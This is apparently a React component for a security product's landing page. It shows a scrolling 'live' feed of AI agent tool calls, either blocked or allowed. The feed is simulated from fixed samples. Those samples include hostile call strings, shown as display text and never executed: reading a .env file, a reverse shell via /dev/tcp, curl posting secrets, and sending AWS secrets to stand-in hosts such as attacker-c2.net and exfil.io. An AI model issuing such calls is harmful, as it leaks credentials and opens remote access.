'use client';

import { useEffect, useRef, useState } from 'react';

interface ThreatEvent {
  id: number;
  verdict: 'BLOCKED' | 'ALLOWED';
  tool: string;
  client: string;
  gate: string;
  latency: string;
}

const BASE_EVENTS: Omit<ThreatEvent, 'id'>[] = [
  { verdict: 'BLOCKED', tool: 'filesystem.read_file(../../.env)', client: 'Cursor Agent', gate: 'CBAC Gate 2', latency: '1.8µs' },
  { verdict: 'ALLOWED', tool: 'weather.lookup({city:"SF"})', client: 'Claude Desktop', gate: 'Policy Clear', latency: '1.9µs' },
  { verdict: 'BLOCKED', tool: 'network.http_post(attacker-c2.net)', client: 'Windsurf', gate: 'DIFC Taint', latency: '2.4µs' },
  { verdict: 'BLOCKED', tool: 'bash.spawn("bash -i >&/dev/tcp/…")', client: 'LangChain', gate: 'Schema Gate 1', latency: '2.1µs' },
  { verdict: 'ALLOWED', tool: 'filesystem.read_file(src/index.ts)', client: 'Cursor Agent', gate: 'Policy Clear', latency: '2.0µs' },
  { verdict: 'BLOCKED', tool: 'env.AWS_SECRET → exfil.io', client: 'AutoGen', gate: 'DIFC Taint', latency: '3.1µs' },
  { verdict: 'ALLOWED', tool: 'git.log(--oneline -10)', client: 'Windsurf', gate: 'Policy Clear', latency: '1.7µs' },
  { verdict: 'BLOCKED', tool: 'process.spawn("curl", ["-d", secrets])', client: 'Claude Desktop', gate: 'CBAC Gate 2', latency: '1.6µs' },
];

let eventCounter = BASE_EVENTS.length;

function getRandomEvent(): ThreatEvent {
  const base = BASE_EVENTS[Math.floor(Math.random() * BASE_EVENTS.length)];
  return { ...base, id: ++eventCounter };
}

export function LiveThreatTicker() {
  const [events, setEvents] = useState<ThreatEvent[]>(() =>
    BASE_EVENTS.map((e, i) => ({ ...e, id: i }))
  );
  const trackRef = useRef<HTMLDivElement>(null);

  // Add a new event every 2.2 seconds
  useEffect(() => {
    const interval = setInterval(() => {
      setEvents((prev) => [getRandomEvent(), ...prev.slice(0, 19)]);
    }, 2200);
    return () => clearInterval(interval);
  }, []);

  const displayed = [...events, ...events]; // duplicate for seamless scroll

  return (
    <div className="lp-threat-ticker" aria-label="Live threat interception feed">
      <div className="lp-threat-ticker-label">
        <span className="lp-threat-live-dot" aria-hidden="true" />
        <span>LIVE INTERCEPTS</span>
      </div>
      <div className="lp-threat-ticker-fade-left" aria-hidden="true" />
      <div className="lp-threat-ticker-fade-right" aria-hidden="true" />
      <div className="lp-threat-ticker-scroll" ref={trackRef}>
        <div className="lp-threat-ticker-track">
          {displayed.map((event, idx) => (
            <div
              key={`${event.id}-${idx}`}
              className={`lp-threat-chip ${event.verdict === 'BLOCKED' ? 'lp-threat-chip-blocked' : 'lp-threat-chip-allowed'}`}
            >
              <span className="lp-threat-verdict">{event.verdict === 'BLOCKED' ? '⛔' : '✓'}</span>
              <span className="lp-threat-tool">{event.tool}</span>
              <span className="lp-threat-meta">{event.client}</span>
              <span className="lp-threat-gate">{event.gate}</span>
              <span className="lp-threat-latency">{event.latency}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
